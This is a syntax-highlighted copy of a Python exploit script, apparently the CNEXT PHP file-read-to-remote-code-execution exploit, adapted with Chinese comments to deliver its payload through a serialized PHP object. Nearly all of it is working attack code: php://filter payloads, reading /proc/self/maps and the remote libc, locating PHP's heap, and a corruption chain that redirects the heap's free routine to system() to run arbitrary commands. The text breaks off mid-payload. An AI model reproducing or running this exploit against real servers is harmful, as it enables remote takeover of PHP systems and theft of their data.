class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># CNEXT: PHP file-read to RCE</span></span><br><span class="line"><span class="comment"># Date: 2024-05-27</span></span><br><span class="line"><span class="comment"># Author: Charles FOL @cfreal_ (LEXFO/AMBIONICS)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># TODO Parse LIBC to know if patched</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># INFORMATIONS</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># To use, implement the Remote class, which tells the exploit how to send the payload.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># REQUIREMENTS</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Requires ten: https://github.com/cfreal/ten</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> annotations</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> dataclasses <span class="keyword">import</span> dataclass</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> requests.exceptions <span class="keyword">import</span> ChunkedEncodingError, ConnectionError</span><br><span class="line"><span class="keyword">from</span> ten <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">HEAP_SIZE = <span class="number">2</span> * <span class="number">1024</span> * <span class="number">1024</span></span><br><span class="line">BUG = <span class="string">&quot;劄&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Remote</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;A helper class to send the payload and download files.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    The logic of the exploit is always the same, but the exploit needs to know how to</span></span><br><span class="line"><span class="string">    download files (/proc/self/maps and libc) and how to send the payload.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    The code here serves as an example that attacks a page that looks like:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Tweak it to fit your target, and start the exploit.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, url: <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        self.url = url</span><br><span class="line">        self.session = Session()</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">send</span>(<span class="params">self, path: <span class="built_in">str</span></span>) -&gt; Response:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;Sends given `path` to the HTTP server. Returns the response.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        p = <span class="string">f&quot;php://filter/convert.base64-encode/resource=<span class="subst">&#123;path&#125;</span>&quot;</span></span><br><span class="line">        <span class="comment"># 生成序列化字符串，并计算编码后的路径长度</span></span><br><span class="line">        a = <span class="built_in">len</span>(p)</span><br><span class="line">        serialized_path = <span class="string">f&#x27;O:4:&quot;cls1&quot;:2:&#123;&#123;s:3:&quot;cls&quot;;O:4:&quot;cls2&quot;:2:&#123;&#123;s:8:&quot;filename&quot;;s:<span class="subst">&#123;a&#125;</span>:&quot;<span class="subst">&#123;p&#125;</span>&quot;;s:3:&quot;txt&quot;;s:0:&quot;&quot;;&#125;&#125;s:3:&quot;arr&quot;;a:1:&#123;&#123;i:0;s:7:&quot;fileput&quot;;&#125;&#125;&#125;&#125;;&#x27;</span></span><br><span class="line">        <span class="comment"># 对整个序列化后的字符串进行 base64 编码</span></span><br><span class="line">        encoded_serialized_path = base64.encode(serialized_path.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">        url =self.url</span><br><span class="line">        params=&#123;</span><br><span class="line">                <span class="string">&quot;ser&quot;</span>:encoded_serialized_path</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">print</span>(params)</span><br><span class="line">        response = self.session.get(url, params=params)</span><br><span class="line">        <span class="built_in">print</span>(response.text)</span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line"><span class="comment"># 打印实际请求的 UR</span></span><br><span class="line">       <span class="comment"># return self.session.get(url, params=params)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">download</span>(<span class="params">self, path: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;Returns the contents of a remote file.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment">#     p = f&quot;php://filter/convert.base64-encode/resource=&#123;path&#125;&quot;</span></span><br><span class="line">    <span class="comment"># # 生成序列化字符串，并计算编码后的路径长度</span></span><br><span class="line">    <span class="comment">#     a = len(p)</span></span><br><span class="line">    <span class="comment">#     serialized_path = f&#x27;O:4:&quot;cls1&quot;:2:&#123;&#123;s:3:&quot;cls&quot;;O:4:&quot;cls2&quot;:2:&#123;&#123;s:8:&quot;filename&quot;;s:&#123;a&#125;:&quot;&#123;p&#125;&quot;;s:3:&quot;txt&quot;;s:0:&quot;&quot;;&#125;&#125;s:3:&quot;arr&quot;;a:1:&#123;&#123;i:0;s:7:&quot;fileput&quot;;&#125;&#125;&#125;&#125;;&#x27;</span></span><br><span class="line">    <span class="comment"># # 对整个序列化后的字符串进行 base64 编码</span></span><br><span class="line">    <span class="comment">#     encoded_serialized_path = base64.encode(serialized_path.encode(&#x27;utf-8&#x27;))</span></span><br><span class="line">    <span class="comment">#     print(encoded_serialized_path)</span></span><br><span class="line">    <span class="comment"># 发送请求，获取响应</span></span><br><span class="line">        response = self.send(path)</span><br><span class="line">        <span class="built_in">print</span>(response)</span><br><span class="line">        <span class="comment">#path = f&quot;php://filter/convert.base64-encode/resource=&#123;path&#125;&quot;</span></span><br><span class="line">        <span class="comment">#response = self.send(path)</span></span><br><span class="line">        data = re.search(<span class="string">r&#x27;Your file:(.*)&#x27;</span>, response.text, flags=re.S).group(<span class="number">1</span>)</span><br><span class="line">        <span class="comment">#data=response.text</span></span><br><span class="line">        <span class="keyword">return</span> base64.decode(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@entry</span></span><br><span class="line"><span class="meta">@arg(<span class="params"><span class="string">&quot;url&quot;</span>, <span class="string">&quot;Target URL&quot;</span></span>)</span></span><br><span class="line"><span class="meta">@arg(<span class="params"><span class="string">&quot;command&quot;</span>, <span class="string">&quot;Command to run on the system; limited to 0x140 bytes&quot;</span></span>)</span></span><br><span class="line"><span class="meta">@arg(<span class="params"><span class="string">&quot;sleep_time&quot;</span>, <span class="string">&quot;Time to sleep to assert that the exploit worked. By default, 1.&quot;</span></span>)</span></span><br><span class="line"><span class="meta">@arg(<span class="params"><span class="string">&quot;heap&quot;</span>, <span class="string">&quot;Address of the main zend_mm_heap structure.&quot;</span></span>)</span></span><br><span class="line"><span class="meta">@arg(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="meta">    <span class="string">&quot;pad&quot;</span>,</span></span></span><br><span class="line"><span class="params"><span class="meta">    <span class="string">&quot;Number of 0x100 chunks to pad with. If the website makes a lot of heap &quot;</span></span></span></span><br><span class="line"><span class="params"><span class="meta">    <span class="string">&quot;operations with this size, increase this. Defaults to 20.&quot;</span>,</span></span></span><br><span class="line"><span class="params"><span class="meta"></span>)</span></span><br><span class="line"><span class="meta">@dataclass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Exploit</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;CNEXT exploit: RCE using a file read primitive in PHP.&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    url: <span class="built_in">str</span></span><br><span class="line">    command: <span class="built_in">str</span></span><br><span class="line">    sleep: <span class="built_in">int</span> = <span class="number">1</span></span><br><span class="line">    heap: <span class="built_in">str</span> = <span class="literal">None</span></span><br><span class="line">    pad: <span class="built_in">int</span> = <span class="number">20</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__post_init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.remote = Remote(self.url)</span><br><span class="line">        self.log = logger(<span class="string">&quot;EXPLOIT&quot;</span>)</span><br><span class="line">        self.info = &#123;&#125;</span><br><span class="line">        self.heap = self.heap <span class="keyword">and</span> <span class="built_in">int</span>(self.heap, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check_vulnerable</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;Checks whether the target is reachable and properly allows for the various</span></span><br><span class="line"><span class="string">        wrappers and filters that the exploit needs.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">safe_download</span>(<span class="params">path: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                rep=self.remote.download(path)</span><br><span class="line">                <span class="keyword">return</span> rep</span><br><span class="line">            <span class="keyword">except</span> ConnectionError:</span><br><span class="line">                failure(<span class="string">&quot;Target not [b]reachable[/] ?&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">check_token</span>(<span class="params">text: <span class="built_in">str</span>, path: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">            result = safe_download(path)</span><br><span class="line">            <span class="keyword">return</span> text.encode() == result</span><br><span class="line"></span><br><span class="line">        text = tf.random.string(<span class="number">50</span>).encode()</span><br><span class="line">        base64 = b64(text, misalign=<span class="literal">True</span>).decode()</span><br><span class="line">        path = <span class="string">f&quot;data:text/plain;base64,<span class="subst">&#123;base64&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">        result = safe_download(path)</span><br><span class="line">        <span class="comment">#print(base64.encode(result))</span></span><br><span class="line">        <span class="keyword">if</span> text <span class="keyword">not</span> <span class="keyword">in</span> result:</span><br><span class="line">            msg_failure(<span class="string">&quot;Remote.download did not return the test string&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;--------------------&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Expected test string: <span class="subst">&#123;text&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Got: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;--------------------&quot;</span>)</span><br><span class="line">            failure(<span class="string">&quot;If your code works fine, it means that the [i]data://[/] wrapper does not work&quot;</span>)</span><br><span class="line"></span><br><span class="line">        msg_info(<span class="string">&quot;The [i]data://[/] wrapper works&quot;</span>)</span><br><span class="line"></span><br><span class="line">        text = tf.random.string(<span class="number">50</span>)</span><br><span class="line">        base64 = b64(text.encode(), misalign=<span class="literal">True</span>).decode()</span><br><span class="line">        path = <span class="string">f&quot;php://filter//resource=data:text/plain;base64,<span class="subst">&#123;base64&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> check_token(text, path):</span><br><span class="line">            failure(<span class="string">&quot;The [i]php://filter/[/] wrapper does not work&quot;</span>)</span><br><span class="line"></span><br><span class="line">        msg_info(<span class="string">&quot;The [i]php://filter/[/] wrapper works&quot;</span>)</span><br><span class="line"></span><br><span class="line">        text = tf.random.string(<span class="number">50</span>)</span><br><span class="line">        base64 = b64(compress(text.encode()), misalign=<span class="literal">True</span>).decode()</span><br><span class="line">        path = <span class="string">f&quot;php://filter/zlib.inflate/resource=data:text/plain;base64,<span class="subst">&#123;base64&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> check_token(text, path):</span><br><span class="line">            failure(<span class="string">&quot;The [i]zlib[/] extension is not enabled&quot;</span>)</span><br><span class="line"></span><br><span class="line">        msg_info(<span class="string">&quot;The [i]zlib[/] extension is enabled&quot;</span>)</span><br><span class="line"></span><br><span class="line">        msg_success(<span class="string">&quot;Exploit preconditions are satisfied&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_file</span>(<span class="params">self, path: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="keyword">with</span> msg_status(<span class="string">f&quot;Downloading [i]<span class="subst">&#123;path&#125;</span>[/]...&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> self.remote.download(path)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_regions</span>(<span class="params">self</span>) -&gt; <span class="built_in">list</span>[Region]:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;Obtains the memory regions of the PHP process by querying /proc/self/maps.&quot;&quot;&quot;</span></span><br><span class="line">        maps = self.get_file(<span class="string">&quot;/proc/self/maps&quot;</span>)</span><br><span class="line">        maps = maps.decode()</span><br><span class="line">        PATTERN = re.<span class="built_in">compile</span>(</span><br><span class="line">            <span class="string">r&quot;^([a-f0-9]+)-([a-f0-9]+)\b&quot;</span> <span class="string">r&quot;.*&quot;</span> <span class="string">r&quot;\s([-rwx]&#123;3&#125;[ps])\s&quot;</span> <span class="string">r&quot;(.*)&quot;</span></span><br><span class="line">        )</span><br><span class="line">        regions = []</span><br><span class="line">        <span class="keyword">for</span> region <span class="keyword">in</span> table.split(maps, strip=<span class="literal">True</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">match</span> := PATTERN.<span class="keyword">match</span>(region):</span><br><span class="line">                start = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">1</span>), <span class="number">16</span>)</span><br><span class="line">                stop = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">2</span>), <span class="number">16</span>)</span><br><span class="line">                permissions = <span class="keyword">match</span>.group(<span class="number">3</span>)</span><br><span class="line">                path = <span class="keyword">match</span>.group(<span class="number">4</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;/&quot;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">&quot;[&quot;</span> <span class="keyword">in</span> path:</span><br><span class="line">                    path = path.rsplit(<span class="string">&quot; &quot;</span>, <span class="number">1</span>)[-<span class="number">1</span>]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    path = <span class="string">&quot;&quot;</span></span><br><span class="line">                current = Region(start, stop, permissions, path)</span><br><span class="line">                regions.append(current)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(maps)</span><br><span class="line">                failure(<span class="string">&quot;Unable to parse memory mappings&quot;</span>)</span><br><span class="line"></span><br><span class="line">        self.log.info(<span class="string">f&quot;Got <span class="subst">&#123;<span class="built_in">len</span>(regions)&#125;</span> memory regions&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> regions</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_symbols_and_addresses</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;Obtains useful symbols and addresses from the file read primitive.&quot;&quot;&quot;</span></span><br><span class="line">        regions = self.get_regions()</span><br><span class="line"></span><br><span class="line">        LIBC_FILE = <span class="string">&quot;/dev/shm/cnext-libc&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># PHP&#x27;s heap</span></span><br><span class="line"></span><br><span class="line">        self.info[<span class="string">&quot;heap&quot;</span>] = self.heap <span class="keyword">or</span> self.find_main_heap(regions)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Libc</span></span><br><span class="line"></span><br><span class="line">        libc = self._get_region(regions, <span class="string">&quot;libc-&quot;</span>, <span class="string">&quot;libc.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">        self.download_file(libc.path, LIBC_FILE)</span><br><span class="line"></span><br><span class="line">        self.info[<span class="string">&quot;libc&quot;</span>] = ELF(LIBC_FILE, checksec=<span class="literal">False</span>)</span><br><span class="line">        self.info[<span class="string">&quot;libc&quot;</span>].address = libc.start</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_get_region</span>(<span class="params">self, regions: <span class="built_in">list</span>[Region], *names: <span class="built_in">str</span></span>) -&gt; Region:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;Returns the first region whose name matches one of the given names.&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> region <span class="keyword">in</span> regions:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">any</span>(name <span class="keyword">in</span> region.path <span class="keyword">for</span> name <span class="keyword">in</span> names):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            failure(<span class="string">&quot;Unable to locate region&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> region</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">download_file</span>(<span class="params">self, remote_path: <span class="built_in">str</span>, local_path: <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;Downloads `remote_path` to `local_path`&quot;&quot;&quot;</span></span><br><span class="line">        data = self.get_file(remote_path)</span><br><span class="line">        Path(local_path).write(data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_main_heap</span>(<span class="params">self, regions: <span class="built_in">list</span>[Region]</span>) -&gt; Region:</span><br><span class="line">        <span class="comment"># Any anonymous RW region with a size superior to the base heap size is a</span></span><br><span class="line">        <span class="comment"># candidate. The heap is at the bottom of the region.</span></span><br><span class="line">        heaps = [</span><br><span class="line">            region.stop - HEAP_SIZE + <span class="number">0x40</span></span><br><span class="line">            <span class="keyword">for</span> region <span class="keyword">in</span> <span class="built_in">reversed</span>(regions)</span><br><span class="line">            <span class="keyword">if</span> region.permissions == <span class="string">&quot;rw-p&quot;</span></span><br><span class="line">            <span class="keyword">and</span> region.size &gt;= HEAP_SIZE</span><br><span class="line">            <span class="keyword">and</span> region.stop &amp; (HEAP_SIZE - <span class="number">1</span>) == <span class="number">0</span></span><br><span class="line">            <span class="keyword">and</span> region.path == <span class="string">&quot;&quot;</span></span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> heaps:</span><br><span class="line">            failure(<span class="string">&quot;Unable to find PHP&#x27;s main heap in memory&quot;</span>)</span><br><span class="line"></span><br><span class="line">        first = heaps[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(heaps) &gt; <span class="number">1</span>:</span><br><span class="line">            heaps = <span class="string">&quot;, &quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">hex</span>, heaps))</span><br><span class="line">            msg_info(<span class="string">f&quot;Potential heaps: [i]<span class="subst">&#123;heaps&#125;</span>[/] (using first)&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            msg_info(<span class="string">f&quot;Using [i]<span class="subst">&#123;<span class="built_in">hex</span>(first)&#125;</span>[/] as heap&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> first</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        self.check_vulnerable()</span><br><span class="line">        self.get_symbols_and_addresses()</span><br><span class="line">        self.exploit()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">build_exploit_path</span>(<span class="params">self</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line"></span><br><span class="line">        LIBC = self.info[<span class="string">&quot;libc&quot;</span>]</span><br><span class="line">        ADDR_EMALLOC = LIBC.symbols[<span class="string">&quot;__libc_malloc&quot;</span>]</span><br><span class="line">        ADDR_EFREE = LIBC.symbols[<span class="string">&quot;__libc_system&quot;</span>]</span><br><span class="line">        ADDR_EREALLOC = LIBC.symbols[<span class="string">&quot;__libc_realloc&quot;</span>]</span><br><span class="line"></span><br><span class="line">        ADDR_HEAP = self.info[<span class="string">&quot;heap&quot;</span>]</span><br><span class="line">        ADDR_FREE_SLOT = ADDR_HEAP + <span class="number">0x20</span></span><br><span class="line">        ADDR_CUSTOM_HEAP = ADDR_HEAP + <span class="number">0x0168</span></span><br><span class="line"></span><br><span class="line">        ADDR_FAKE_BIN = ADDR_FREE_SLOT - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">        CS = <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Pad needs to stay at size 0x100 at every step</span></span><br><span class="line">        pad_size = CS - <span class="number">0x18</span></span><br><span class="line">        pad = <span class="string">b&quot;\x00&quot;</span> * pad_size</span><br><span class="line">        pad = chunked_chunk(pad, <span class="built_in">len</span>(pad) + <span class="number">6</span>)</span><br><span class="line">        pad = chunked_chunk(pad, <span class="built_in">len</span>(pad) + <span class="number">6</span>)</span><br><span class="line">        pad = chunked_chunk(pad, <span class="built_in">len</span>(pad) + <span class="number">6</span>)</span><br><span class="line">        pad = compressed_bucket(pad)</span><br><span class="line"></span><br><span class="line">        step1_size = <span class="number">1</span></span><br><span class="line">        step1 = <span class="string">b&quot;\x00&quot;</span> * step1_size</span><br><span class="line">        step1 = chunked_chunk(step1)</span><br><span class="line">        step1 = chunked_chunk(step1)</span><br><span class="line">        step1 = chunked_chunk(step1, CS)</span><br><span class="line">        step1 = compressed_bucket(step1)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Since these chunks contain non-UTF-8 chars, we cannot let it get converted to</span></span><br><span class="line">        <span class="comment"># ISO-2022-CN-EXT. We add a `0\n` that makes the 4th and last dechunk &quot;crash&quot;</span></span><br><span class="line"></span><br><span class="line">        step2_size = <span class="number">0x48</span></span><br><span class="line">        step2 = <span class="string">b&quot;\x00&quot;</span> * (step2_size + <span class="number">8</span>)</span><br><span class="line">        step2 = chunked_chunk(step2, CS)</span><br><span class="line">        step2 = chunked_chunk(step2)</span><br><span class="line">        step2 = compressed_bucket(step2)</span><br><span class="line"></span><br><span class="line">        step2_write_ptr = <span class="string">b&quot;0\n&quot;</span>.ljust(step2_size, <span class="string">b&quot;\x00&quot;</span>) + p64(ADDR_FAKE_BIN)</span><br><span class="line">        step2_write_ptr = chunked_chunk(step2_write_ptr, CS)</span><br><span class="line">        step2_write_ptr = chunked_chunk(step2_write_ptr)</span><br><span class="line">        step2_write_ptr = compressed_bucket(step2_write_ptr)</span><br><span class="line"></span><br><span class="line">        step3_size = CS</span><br><span class="line"></span><br><span class="line">        step3 = <span class="string">b&quot;\x00&quot;</span> * step3_size</span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">len</span>(step3) == CS</span><br><span class="line">        step3 = chunked_chunk(step3)</span><br><span class="line">        step3 = chunked_chunk(step3)</span><br><span class="line">        step3 = chunked_chunk(step3)</span><br><span class="line">        step3 = compressed_bucket(step3)</span><br><span class="line"></span><br><span class="line">        step3_overflow = <span class="string">b&quot;\x00&quot;</span> * (step3_size - <span class="built_in">len</span>(BUG)) + BUG</span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">len</span>(step3_overflow) == CS</span><br><span class="line">        step3_overflow = chunked_chunk(step3_overflow)</span><br><span class="line">        step3_overflow = chunked_chunk(step3_overflow)</span><br><span class="line">        step3_overflow = chunked_chunk(step3_overflow)</span><br><span class="line">        step3_overflow = compressed_bucket(step3_overflow)</span><br><span class="line"></span><br><span class="line">        step4_size = CS</span><br><span class="line">        step4 = <span class="string">b&quot;=00&quot;</span> + <span class="string">b&quot;\x00&quot;</span> * (step4_size - <span class="number">1</span>)</span><br><span class="line">        step4 = chunked_chunk(step4)</span><br><span class="line">        step4 = chunked_chunk(step4)</span><br><span class="line">        step4 = chunked_chunk(step4)</span><br><span class="line">        step4 = compressed_bucket(step4)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># This chunk will eventually overwrite mm_heap-&gt;free_slot</span></span><br><span class="line">        <span class="comment"># it is actually allocated 0x10 bytes BEFORE it, thus the two filler values</span></span><br><span class="line">        step4_pwn = ptr_bucket(</span><br><span class="line">            <span class="number">0x200000</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="comment"># free_slot</span></span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            ADDR_CUSTOM_HEAP,  <span class="comment"># 0x18</span></span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span 